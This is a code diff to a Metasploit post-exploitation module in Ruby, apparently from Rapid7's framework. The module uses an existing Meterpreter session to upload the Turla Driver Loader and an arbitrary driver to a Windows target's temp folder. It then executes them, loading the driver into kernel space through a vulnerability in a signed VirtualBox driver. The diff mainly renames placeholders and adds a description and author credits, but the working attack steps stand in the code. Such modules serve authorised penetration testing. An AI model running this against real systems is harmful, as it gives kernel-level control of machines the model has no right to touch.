@@ -10,14 +10,20 @@ class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
-      'Name'          => 'tdl stuff',
+      'Name'          => 'Turla Driver Loader',
       'Description'   => %q{
-          This does a thing to the stuff with the turla driver loader.
+          This module uses the Turla Driver Loader to inject an arbitrary driver into
+          kernel space on a target by way of a vulnerability in a signed Oracle VirtualBox 
+          driver.  The tool itself must be obtained and installed by the end user of this
+          module.
+
+          See https://github.com/hfiref0x/TDL for details.
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
         [
-          'wvw <wut@wut.com>'
+          'hfiref0x',                                    # Turla Driver Loader
+          'William Webb <william_webb[at]rapid7.com>'    # Metasploit module
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -30,9 +36,9 @@ class MetasploitModule < Msf::Post
 
   end
 
-  def upload_stuff(file, rfilename, directory="c:\\windows\\temp\\")
+  def upload_files(file, rfilename, directory="c:\\windows\\temp\\")
     begin
-      print_status("File #{directory + rfilename} being uploaded..")
+      print_status("Target #{directory + rfilename} being uploaded..")
       write_file(directory + rfilename, file)
     rescue Rex::Post::Meterpreter::RequestError => e
       fail_with(Failure::Unknown, "Error uploading file #{directory + rfilename}: #{e.class} #{e}")
@@ -41,14 +47,14 @@ class MetasploitModule < Msf::Post
 
   def run
 
-    if datastore['DRIVER']
+    if datastore['DRIVER'].to_s.length > 0
       print_status("Using driver file #{datastore['DRIVER']}")
       driver_local = File.open(datastore['DRIVER'])
     else
-      driver_local = File.open(File.join(Msf::Config.local_directory, "tdl", "drv.sys"))
+      driver_local = File.open(File.join(Msf::Config.local_directory, "tdl", "driver.sys"))
     end
 
-    if datastore['TDL']
+    if datastore['TDL'].to_s.length > 0
       print_status("Using TDL executable #{datastore['TDL']}")
       tdl_local = File.open(datastore['TDL'])
     else
@@ -70,14 +76,13 @@ class MetasploitModule < Msf::Post
     driver_local.close
 
     print_status("Uploading Turla driver loader ...")
-    upload_stuff(hfile, tdl_rfile)
+    upload_files(hfile, tdl_rfile)
 
     print_status("Uploading driver ....")
-    upload_stuff(hdrv, driver_rfile)
+    upload_files(hdrv, driver_rfile)
 
     print_status("Executing TDL ...")
 
-    # be sure this is /C in release
     cmd_exec("cmd.exe /C start c:\\windows\\temp\\#{tdl_rfile} c:\\windows\\temp\\#{driver_rfile} & pause", nil, 5)
   end
 
